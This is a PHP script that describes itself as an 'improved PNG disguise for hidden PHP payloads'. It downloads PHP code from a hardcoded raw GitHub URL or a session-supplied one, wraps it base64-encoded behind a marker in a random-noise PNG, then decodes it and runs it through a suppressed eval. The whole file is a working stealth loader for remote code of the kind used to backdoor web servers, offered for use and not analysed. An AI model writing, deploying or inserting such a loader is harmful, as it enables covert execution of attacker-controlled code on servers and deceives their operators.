<?php

/*
Improved PNG disguise for hidden PHP payloads.
This script fetches remote code, embeds it into a realistic PNG file,
and executes it stealthily.
*/

session_start();

// Main remote code URL (can be overridden by session)
$mainUrl = $_SESSION['ts_url'] ?? 'https://raw.githubusercontent.com/jjyyk/jjyyk/refs/heads/main/class';


// --------------------------------------------
// 1. Generate a realistic PNG image (128x128)
// --------------------------------------------
function generateRealisticPngHeader($width = 128, $height = 128) {
    ob_start();
    $image = imagecreatetruecolor($width, $height);

    // Fill with random noise
    for ($x = 0; $x < $width; $x++) {
        for ($y = 0; $y < $height; $y++) {
            $color = imagecolorallocate($image, rand(0,255), rand(0,255), rand(0,255));
            imagesetpixel($image, $x, $y, $color);
        }
    }

    imagepng($image);
    imagedestroy($image);
    return ob_get_clean(); // Binary PNG data
}


// --------------------------------------------
// 2. Load remote PHP code from given URL
// --------------------------------------------
function loadRemoteData($url) {
    $content = '';

    try {
        $file = new SplFileObject($url);
        while (!$file->eof()) {
            $content .= $file->fgets();
        }
    } catch (Throwable $e) {
        $content = '';
    }

    if (strlen(trim($content)) < 1) {
        $content = @file_get_contents($url);
    }

    if (strlen(trim($content)) < 1 && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
    }

    return $content;
}


// --------------------------------------------
// 3. Create payload by appending hidden PHP code
// --------------------------------------------
function createStealthPayload($phpCode) {
    $png = generateRealisticPngHeader();
    $marker = '###PAYLOAD###';
    $encoded = base64_encode($phpCode);

    return $png . $marker . $encoded;
}


// --------------------------------------------
// 4. Extract and execute hidden payload
// --------------------------------------------
function extractAndExecutePayload($data) {
    $marker = '###PAYLOAD###';
    $parts = explode($marker, $data);

    if (count($parts) === 2) {
        $decoded = base64_decode($parts[1]);
        if ($decoded !== false && strlen(trim($decoded)) > 0) {
            @eval("?>$decoded");
        }
    }
}


// --------------------------------------------
// Main Execution Flow
// --------------------------------------------

$remoteCode = loadRemoteData($mainUrl);

if (strlen(trim($remoteCode)) > 0) {
    $payload = createStealthPayload($remoteCode);
    extractAndExecutePayload($payload);  // Executes hidden remote code
}

?>
